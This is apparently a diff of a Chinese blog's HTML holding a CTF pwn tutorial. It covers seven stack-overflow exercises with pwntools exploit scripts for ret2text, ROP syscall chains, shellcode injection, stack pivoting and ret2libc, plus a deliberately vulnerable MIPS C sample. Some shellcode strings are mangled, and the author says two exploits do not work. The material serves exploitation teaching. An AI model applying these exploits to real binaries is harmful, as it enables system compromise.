 <p><img src="http://file.smilehacker.net/1571477030249.png" alt="IDA搜索结果"></p>
 <p>接下来使用<a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener"><code>pwntools</code></a>这个库来编写<code>EXP</code>:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pwn1 = process(<span class="string">'./pwn1'</span>)</span><br><span class="line">sh = <span class="number">0x804863a</span></span><br><span class="line">pwn1.sendline(<span class="string">'A'</span> * (<span class="number">112</span>) + p32(sh))</span><br><span class="line">pwn1.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from pwn import *
 
+pwn1 = process(&#39;./pwn1&#39;)
+sh = 0x804863a
+pwn1.sendline(&#39;A&#39; * (112) + p32(sh))
+pwn1.interactive()</code></pre>
 <p>运行后成功拿到<code>shell</code>,第一关很简单.</p>
 <p><img src="http://file.smilehacker.net/1571477253129.png" alt="reverse shell"></p>
 <h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><p>下载题目:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop/pwn2" target="_blank" rel="noopener">pwn2</a></p>
@@ -543,23 +956,36 @@
 </li>
 </ul>
 <p>汇编代码如下:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pop eax,   # 系统调用号载入， execve为0xb</span><br><span class="line">pop ebx,     # 第一个参数， /bin/sh的string</span><br><span class="line">pop ecx,    # 第二个参数，0</span><br><span class="line">pop edx,   # 第三个参数，0</span><br><span class="line">int 0x80,   # 执行系统调用</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">pop eax,   # 系统调用号载入， execve为0xb
+pop ebx,     # 第一个参数， /bin/sh的string
+pop ecx,    # 第二个参数，0
+pop edx,   # 第三个参数，0
+int 0x80,   # 执行系统调用</code></pre>
 <p>由于程序内没有<code>system</code>调用，我们需要人为的构造。</p>
 <h3 id="查找ROP链"><a href="#查找ROP链" class="headerlink" title="查找ROP链"></a>查找ROP链</h3><p>使用<a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">ROPgadget</a> 查找我们需要的命令。从上面的分析可以知道我们需要对4个寄存器进行操作<code>eax</code>,<code>ebx</code>,<code>ecx</code>,<code>edx</code></p>
 <p>安装好<code>ROPgadget</code>后执行</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn2 --only 'pop|ret' | grep "eax" </span><br><span class="line">ROPgadget --binary pwn2 --only 'pop|ret' | grep "ebx" </span><br><span class="line">ROPgadget --binary pwn2 --only 'pop|ret' | grep "ecx" </span><br><span class="line">ROPgadget --binary pwn2 --only 'pop|ret' | grep "edx" </span><br><span class="line"></span><br><span class="line">ROPgadget --binary pwn2 --only 'int'</span><br><span class="line">ROPgadget --binary pwn2 --string '/bin/sh'</span><br></pre></td></tr></table></figure>
+<pre><code class="shell"> ROPgadget --binary pwn2 --only &#39;pop|ret&#39; | grep &quot;eax&quot; 
+ ROPgadget --binary pwn2 --only &#39;pop|ret&#39; | grep &quot;ebx&quot; 
+ ROPgadget --binary pwn2 --only &#39;pop|ret&#39; | grep &quot;ecx&quot; 
+ ROPgadget --binary pwn2 --only &#39;pop|ret&#39; | grep &quot;edx&quot; 
 
+ ROPgadget --binary pwn2 --only &#39;int&#39;
+ ROPgadget --binary pwn2 --string &#39;/bin/sh&#39;</code></pre>
 <p>但是在执行寻找<code>ecx</code>之后发现有一条连续<code>pop ecx; pop ebx</code>的指令,我们可以直接用。当然，分开选用两条</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pop ebx; ret </span><br><span class="line">pop ecx; ret</span><br></pre></td></tr></table></figure>
-
+<pre><code class="assembly">pop ebx; ret 
+pop ecx; ret</code></pre>
 <p>也是完全可以的，但是这里并没有单条<code>pop ecx; ret</code>。不过我们在下面可以用<code>0x0806eb90</code>处这条指令加深理解</p>
 <p> <img src="http://file.smilehacker.net/1571496009275.png" alt="搜索结果"></p>
 <p>寻找系统调用和需要执行命令的字符串</p>
 <p><img src="http://file.smilehacker.net/1571497154238.png" alt="1571497154238"></p>
 <p> 这里选择的每一个gadgets都含有<code>ret</code>是为了能够使得程序自动持续的选择堆栈中的指令依次执行。在构造这些gadgets之前，我们通过下面的堆栈指针移动图，来分析一下<code>eip</code>指针的移动，以及对应获取的数据内容。<code>ret</code>指令可以理解成去栈顶的数据作为下次跳转的位置。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eip = [esp];</span><br><span class="line"></span><br><span class="line">esp = esp+4;</span><br><span class="line"></span><br><span class="line"># 或者</span><br><span class="line"></span><br><span class="line">pop eip;</span><br></pre></td></tr></table></figure>
+<pre><code class="assembly">eip = [esp];
 
+esp = esp+4;
+
+# 或者
+
+pop eip;</code></pre>
 <p>此时,我们的堆栈布置如下:</p>
 <p><img src="http://file.smilehacker.net/1571551902372.png" alt="堆栈结构"></p>
 <p>整个堆栈的调用过程:</p>
@@ -570,8 +996,21 @@
 <li>跳转到<code>0x0806eb6a</code>执行代码，取出<code>0</code>存入<code>edx</code>,栈帧下移到<code>0x08049421</code>处</li>
 <li>跳转到<code>0x08049421</code>执行<code>int 0x80</code>中断</li>
 </ol>
-<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./pwn2"</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_ecx_ebx_ret = <span class="number">0x0806eb91</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0806eb6a</span></span><br><span class="line">int_x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x080be408</span></span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">	[<span class="string">'A'</span>*<span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_ecx_ebx_ret, <span class="number">0</span>, binsh, pop_edx_ret,<span class="number">0</span> ,int_x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *
 
+sh = process(&quot;./pwn2&quot;)
+pop_eax_ret = 0x080bb196
+pop_ecx_ebx_ret = 0x0806eb91
+pop_edx_ret = 0x0806eb6a
+int_x80 = 0x08049421
+binsh = 0x080be408
+
+payload = flat(
+    [&#39;A&#39;*112, pop_eax_ret, 0xb, pop_ecx_ebx_ret, 0, binsh, pop_edx_ret,0 ,int_x80])
+sh.sendline(payload)
+sh.interactive()
+
+</code></pre>
 <p>执行<code>EXP</code>，成功拿到<code>shell</code></p>
 <p><img src="http://file.smilehacker.net/1571552245667.png" alt="success"></p>
 <h3 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h3><p>我们用<code>0x0806eb90</code>处的指令重新布置栈帧,加深理解</p>
@@ -579,8 +1018,20 @@
 <p>那么此时的栈帧布局就是:</p>
 <p><img src="http://file.smilehacker.net/1571553359527.png" alt="此时栈帧布局"></p>
 <p>写出POC：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./pwn2"</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0806eb6a</span></span><br><span class="line">int_x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x080be408</span></span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">	[<span class="string">'A'</span>*<span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh,int_x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from pwn import *
 
+sh = process(&quot;./pwn2&quot;)
+pop_eax_ret = 0x080bb196
+pop_edx_ecx_ebx_ret = 0x0806eb90
+pop_edx_ret = 0x0806eb6a
+int_x80 = 0x08049421
+binsh = 0x080be408
+
+payload = flat(
+    [&#39;A&#39;*112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh,int_x80])
+sh.sendline(payload)
+sh.interactive()
+</code></pre>
 <p>成功执行:</p>
 <p><img src="http://file.smilehacker.net/1571553500352.png" alt="成功"></p>
 <h2 id="三"><a href="#三" class="headerlink" title="三"></a>三</h2><p>下载题目:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop/pwn3" target="_blank" rel="noopener">pwn</a></p>
@@ -595,8 +1046,18 @@
 <p><img src="http://file.smilehacker.net/1571555353609.png" alt="SYSTEM函数调用"></p>
 <p>有了<code>system</code>函数之后,用<code>ROPgadget</code>寻找一下<code>/bin/sh</code>这个字符串.</p>
 <p><img src="http://file.smilehacker.net/1571555487359.png" alt="寻找/bin/sh"></p>
-<h3 id="EXP编写-1"><a href="#EXP编写-1" class="headerlink" title="EXP编写"></a>EXP编写</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./pwn3"</span>)</span><br><span class="line"></span><br><span class="line">system_addr= <span class="number">0x08048460</span></span><br><span class="line">sh_addr = <span class="number">0x08048720</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">'A'</span>*<span class="number">112</span>, system_addr, <span class="number">0xabcd1122</span>, sh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="EXP编写-1"><a href="#EXP编写-1" class="headerlink" title="EXP编写"></a>EXP编写</h3><pre><code class="python">from pwn import *
 
+sh = process(&quot;./pwn3&quot;)
+
+system_addr= 0x08048460
+sh_addr = 0x08048720
+
+payload = flat([&#39;A&#39;*112, system_addr, 0xabcd1122, sh_addr])
+sh.sendline(payload)
+
+sh.interactive()
+</code></pre>
 <p>这里需要注意, 为什么在<code>system_addr</code>和<code>sh_addr</code>中间会有4字节的空余部分?</p>
 <p>在正常调用system函数的时候，堆栈位置的<code>system_addr</code>之后的内容为<code>system</code>函数的返回地址，在之后才是新的堆栈的栈顶位置，因此在<code>systetem_addr</code>和<code>sh_addr</code>之间增加了4个字符来进行填充。 </p>
 <h2 id="四"><a href="#四" class="headerlink" title="四"></a>四</h2><p>下载地址: <a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop/pwn4" target="_blank" rel="noopener">pwn</a></p>
@@ -618,8 +1079,8 @@
 <p><img src="http://file.smilehacker.net/1571558124555.png" alt="栈帧的布置"></p>
 <p>看上去还行，但是又有一个新的问题,<code>gets</code>函数执行完的返回地址我们要怎么填写?程序会被这个返回地址直接带跑，直接填成<code>system</code>的地址？那参数又怎么给到system？</p>
 <p>作者在这里的思路是很巧妙的<code>gets</code>函数的返回地址处存指向一条<code>pop x</code>,pop谁都可以，我们主要是利用<code>pop</code>的<code>esp+4</code>的功能。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn4 --only 'pop|ret'</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">ROPgadget --binary pwn4 --only &#39;pop|ret&#39;
+</code></pre>
 <p>用第一条第三条都可以。</p>
 <p><img src="http://file.smilehacker.net/1571558379470.png" alt="ROPgadget运行结果"></p>
 <p>整个运行过程如下:</p>
@@ -630,8 +1091,27 @@
 <li><code>system</code>函数开始执行</li>
 </ol>
 <p>EXP：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./pwn4"</span>)</span><br><span class="line">shelf = ELF(<span class="string">"./pwn4"</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = shelf.plt[<span class="string">'gets'</span>]</span><br><span class="line">system_plt = shelf.plt[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_ebp = <span class="number">0x0804872f</span></span><br><span class="line">buf2 = <span class="number">0x0804A080</span></span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">	[<span class="string">'A'</span>*<span class="number">112</span>, gets_plt, pop_ebp, buf2, system_plt, <span class="number">0xabababab</span>, buf2]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from pwn import *
 
+sh = process(&quot;./pwn4&quot;)
+shelf = ELF(&quot;./pwn4&quot;)
+
+gets_plt = shelf.plt[&#39;gets&#39;]
+system_plt = shelf.plt[&#39;system&#39;]
+
+
+pop_ebp = 0x0804872f
+buf2 = 0x0804A080
+
+payload = flat(
+    [&#39;A&#39;*112, gets_plt, pop_ebp, buf2, system_plt, 0xabababab, buf2]
+)
+
+sh.sendline(payload)
+sh.sendline(&#39;/bin/sh&#39;)
+sh.interactive()
+
+</code></pre>
 <p>成功获得<code>shell</code></p>
 <p><img src="http://file.smilehacker.net/1571558914053.png" alt="成功"></p>
 <h2 id="五"><a href="#五" class="headerlink" title="五"></a>五</h2><p>下载地址:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop_2/pwn5" target="_blank" rel="noopener">pwn</a></p>
@@ -666,16 +1146,30 @@
 <p>64 - 24 -8 =32 （返回地址自身的8个自己要记得计算)</p>
 </blockquote>
 <p><code>expoloit-db</code>上找一段下来:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 23 bytes</span><br><span class="line"># https://www.exploit-db.com/exploits/36858/</span><br><span class="line">shellcode_x64 = &quot;x31xf6x48xbbx2fx62x69x6ex2fx2fx73x68x56x53x54x5fx6ax3bx58x31xd2x0fx05&quot;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="assembly"># 23 bytes
+# https://www.exploit-db.com/exploits/36858/
+shellcode_x64 = &quot;x31xf6x48xbbx2fx62x69x6ex2fx2fx73x68x56x53x54x5fx6ax3bx58x31xd2x0fx05&quot;
+</code></pre>
 <p>好了,啥都有了,继续思考，怎么确定<code>payload</code>的地址?</p>
 <p>那就是<code>buf</code>+32个字节,那新的问题又出来了,<code>buf</code>的地址没法确认(因为程序启用了随机化地址保护)</p>
 <p>无解了。再回去看一下程序的代码，这个<code>printf</code>函数干了什么。它把<code>buf</code>的地址给打印出来了:sweat:</p>
 <p>妙啊~</p>
 <p>然后整理一下，看缓冲区怎么布置</p>
 <p><img src="http://file.smilehacker.net/1571560805846.png" alt="缓冲区布置"></p>
-<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./pwn5'</span>)</span><br><span class="line"><span class="comment"># 23 bytes</span></span><br><span class="line"><span class="comment"># https://www.exploit-db.com/exploits/36858/</span></span><br><span class="line">shellcode_x64 = <span class="string">"x31xf6x48xbbx2fx62x69x6ex2fx2fx73x68x56x53x54x5fx6ax3bx58x31xd2x0fx05"</span></span><br><span class="line">sh.recvuntil(<span class="string">'['</span>)</span><br><span class="line">buf_addr = sh.recvuntil(<span class="string">']'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">buf_addr = int(buf_addr, <span class="number">16</span>)</span><br><span class="line">payload = <span class="string">'b'</span> * <span class="number">24</span> + p64(buf_addr + <span class="number">32</span>) + shellcode_x64</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">~</span><br></pre></td></tr></table></figure>
+<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *
 
+sh = process(&#39;./pwn5&#39;)
+# 23 bytes
+# https://www.exploit-db.com/exploits/36858/
+shellcode_x64 = &quot;x31xf6x48xbbx2fx62x69x6ex2fx2fx73x68x56x53x54x5fx6ax3bx58x31xd2x0fx05&quot;
+sh.recvuntil(&#39;[&#39;)
+buf_addr = sh.recvuntil(&#39;]&#39;, drop=True)
+buf_addr = int(buf_addr, 16)
+payload = &#39;b&#39; * 24 + p64(buf_addr + 32) + shellcode_x64
+sh.sendline(payload)
+sh.interactive()
+~                      
+</code></pre>
 <p>参考一下就好,代码并不能运行。没有细看过<code>pwntools</code>模块,也就不做调试了。</p>
 <h2 id="六"><a href="#六" class="headerlink" title="六"></a>六</h2><p>下载地址:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop_2/pwn6" target="_blank" rel="noopener">pwn</a></p>
 <p><code>checksec</code>检查程序:</p>
@@ -700,18 +1194,32 @@
 <p>所以,我们已经推算处<code>shellcode</code>的位置。</p>
 <p>解决第二个问题</p>
 <p>在函数的返回地址，我们需要一段指令让程序可以跳转到跳转到<code>esp</code>,这样才能继续执行栈帧上的代码:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary stack_pivoting_1 --only 'jmp|ret' | grep 'esp'</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">ROPgadget --binary stack_pivoting_1 --only &#39;jmp|ret&#39; | grep &#39;esp&#39;
+</code></pre>
 <p><img src="http://file.smilehacker.net/1571571949860.png" alt="寻找jmp esp"></p>
 <p>继续回到栈帧执行代码,我们在栈帧之后布置如下指令.</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sub esp 0x28; </span><br><span class="line">jmp esp;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="assembly">sub esp 0x28; 
+jmp esp;
+</code></pre>
 <p><code>shellcode</code>得到执行。</p>
 <p>看一下当前栈帧的布局:</p>
 <p><img src="http://file.smilehacker.net/1571572971883.png" alt="当前栈帧布局"></p>
 <p>仔细想想,不太好懂。</p>
-<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./pwn6'</span>)</span><br><span class="line"></span><br><span class="line">shellcode_x86 = <span class="string">"x31xc9xf7xe1x51x68x2fx2fx73"</span></span><br><span class="line">shellcode_x86 += <span class="string">"x68x68x2fx62x69x6ex89xe3xb0"</span></span><br><span class="line">shellcode_x86 += <span class="string">"x0bxcdx80"</span></span><br><span class="line"></span><br><span class="line">sub_esp_jmp = asm(<span class="string">'sub esp, 0x28;jmp esp'</span>)</span><br><span class="line">jmp_esp = <span class="number">0x08048504</span></span><br><span class="line">payload = shellcode_x86 + (</span><br><span class="line">    <span class="number">0x20</span> - len(shellcode_x86)) * <span class="string">'b'</span> + <span class="string">'bbbb'</span> + p32(jmp_esp) + sub_esp_jmp</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *
 
+sh = process(&#39;./pwn6&#39;)
+
+shellcode_x86 = &quot;x31xc9xf7xe1x51x68x2fx2fx73&quot;
+shellcode_x86 += &quot;x68x68x2fx62x69x6ex89xe3xb0&quot;
+shellcode_x86 += &quot;x0bxcdx80&quot;
+
+sub_esp_jmp = asm(&#39;sub esp, 0x28;jmp esp&#39;)
+jmp_esp = 0x08048504
+payload = shellcode_x86 + (
+    0x20 - len(shellcode_x86)) * &#39;b&#39; + &#39;bbbb&#39; + p32(jmp_esp) + sub_esp_jmp
+sh.sendline(payload)
+sh.interactive()
+</code></pre>
 <p>没办法成功执行,换了个<code>x86</code>平台的shell，我感觉这个<code>shellcode</code>有问题！！</p>
 <h2 id="七"><a href="#七" class="headerlink" title="七"></a>七</h2><p>下载地址: <a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop_2/pwn7" target="_blank" rel="noopener">pwn7</a></p>
 <p>上来还老规矩,使用<code>checksec</code>检查程序保护情况:</p>
@@ -775,8 +1283,8 @@
 </ul>
 <p>第一个问题，如何确认函数<code>A</code>在<code>GOT</code>表中的位置?</p>
 <p>这个问题好说，程序调用函数时是通过<code>PLT</code>表跳转到 GOT 表的对应条目，所以可以在函数调用的汇编指令中找到<code>PLT</code>表中该函数的入口点位置，从而定位到该函数在<code>GOT</code>中的条目。 </p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">call 0x08048430 &lt;printf@plt&gt;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="assembly">call 0x08048430 &lt;printf@plt&gt;
+</code></pre>
 <p>就说明<code>printf</code>在<code>PLT</code>表中的入口点是在 <em>0x08048430*，所以 *0x08048430</em> 处存储的就是<code>GOT</code>表中<code>printf</code>的条目地址。 </p>
 <p>第二个问题， 如何确定函数 B 在内存中的地址？ </p>
 <p>如果开启了<code>ASLR</code>，程序每次动态加载的位置都是随机的，就很难直接定位函数位置。假如函数<code>B</code>已经调用过了，我们通过上一个问题的答案来拿到结果，但是，我们想要的函数系统一般又不会调用，<code>GOT</code>表中并没有相应的记录。那怎么办? 幸运的是，函数在动态链接库内的相对位置是固定的，在动态库打包生成时就已经确定。所以假如我们知道了函数<code>A</code>的运行时地址（读取<code>GOT</code>表内容），也知道函数<code>A</code>和函数<code>B</code>在动态链接库内的相对位置，就可以推算出函数<code>B</code>的运行时地址。 </p>
@@ -801,8 +1309,34 @@
 <li>触发栈溢出执行<code>system(‘/bin/sh’)</code></li>
 </ul>
 <p>整理的<code>EXP</code>如下:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span class="string">'./pwn7'</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">'./pwn7'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = ret2libc3.got[<span class="string">'puts'</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"leak puts_got addr and return to main again"</span></span><br><span class="line">payload = flat([<span class="string">'A'</span> * <span class="number">112</span>, puts_plt, main, puts_got])</span><br><span class="line">sh.sendlineafter(<span class="string">'Can you find it !?'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"get the related addr"</span></span><br><span class="line">puts_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"get shell"</span></span><br><span class="line">payload = flat([<span class="string">'A'</span> * <span class="number">104</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+from LibcSearcher import LibcSearcher
+sh = process(&#39;./pwn7&#39;)
 
+ret2libc3 = ELF(&#39;./pwn7&#39;)
+
+puts_plt = ret2libc3.plt[&#39;puts&#39;]
+puts_got = ret2libc3.got[&#39;puts&#39;]
+main = ret2libc3.symbols[&#39;main&#39;]
+
+print &quot;leak puts_got addr and return to main again&quot;
+payload = flat([&#39;A&#39; * 112, puts_plt, main, puts_got])
+sh.sendlineafter(&#39;Can you find it !?&#39;, payload)
+
+print &quot;get the related addr&quot;
+puts_addr = u32(sh.recv()[0:4])
+libc = LibcSearcher(&#39;puts&#39;, puts_addr)
+libcbase = puts_addr - libc.dump(&#39;puts&#39;)
+system_addr = libcbase + libc.dump(&#39;system&#39;)
+binsh_addr = libcbase + libc.dump(&#39;str_bin_sh&#39;)
+
+print &quot;get shell&quot;
+payload = flat([&#39;A&#39; * 104, system_addr, 0xdeadbeef, binsh_addr])
+sh.sendline(payload)
+
+sh.interactive()
+</code></pre>
 <h3 id="GET-SHELL"><a href="#GET-SHELL" class="headerlink" title="GET SHELL"></a>GET SHELL</h3><p><img src="http://file.smilehacker.net/1572270342624.png" alt="成功获取shell"></p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
 <li><a href="https://www.anquanke.com/post/id/164530" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164530</a></li>
@@ -826,7 +1360,54 @@
     <content><![CDATA[<h4 id="使用GDB调试MIPS架构的缓冲区溢出"><a href="#使用GDB调试MIPS架构的缓冲区溢出" class="headerlink" title="使用GDB调试MIPS架构的缓冲区溢出"></a>使用GDB调试MIPS架构的缓冲区溢出</h4><h4 id="环境介绍和准备工作"><a href="#环境介绍和准备工作" class="headerlink" title="环境介绍和准备工作"></a>环境介绍和准备工作</h4><p>测试的代码都是来自&lt;&lt;解密家用路由器0day挖掘技术&gt;&gt;一书,书上的调试使用的是QEMU + IDA来动态调试,由于最近在学习GDB的调试，所以尝试用QEMU + GDB来调试,权当练手了。</p>
 <p>测试使用的代码(下面代码中存在明显的缓冲区溢出漏洞)：</p>
 <a id="more"></a>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_system</span><span class="params">(<span class="keyword">int</span> code, <span class="keyword">char</span> *cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">255</span>];</span><br><span class="line">    <span class="comment">//sleep(1);</span></span><br><span class="line">    system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> fileLen = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">fileData</span>;</span></span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span> == stat(<span class="string">"passwd"</span>, &amp;fileData))</span><br><span class="line">        fileLen = fileData.st_size;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((fp = fopen(<span class="string">"passwd"</span>, <span class="string">"rb"</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Cannot open file passwd! \n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ch = fgetc(fp);</span><br><span class="line">    <span class="keyword">while</span>(count &lt;= fileLen)&#123;</span><br><span class="line">        buf[count++] = ch;</span><br><span class="line">        ch = fgetc(fp);</span><br><span class="line">    &#125;</span><br><span class="line">    buf[--count] = '\x00';</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(buf, <span class="string">"adminpwd"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        do_system(count, <span class="string">"ls -l"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"you have an invalid password!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">#include&lt;stdio.h&gt;
+#include&lt;sys/stat.h&gt;
+#include&lt;unistd.h&gt;
+
+void do_system(int code, char *cmd)
+{
+    char buf[255];
+    //sleep(1);
+    system(cmd);
+}
+
+void main()
+{
+    char buf[256] = {0};
+    char ch;
+    int count = 0;
+    unsigned int fileLen = 0;
+    struct stat fileData;
+    FILE *fp;
+    if(0 == stat(&quot;passwd&quot;, &amp;fileData))
+        fileLen = fileData.st_size;
+    else
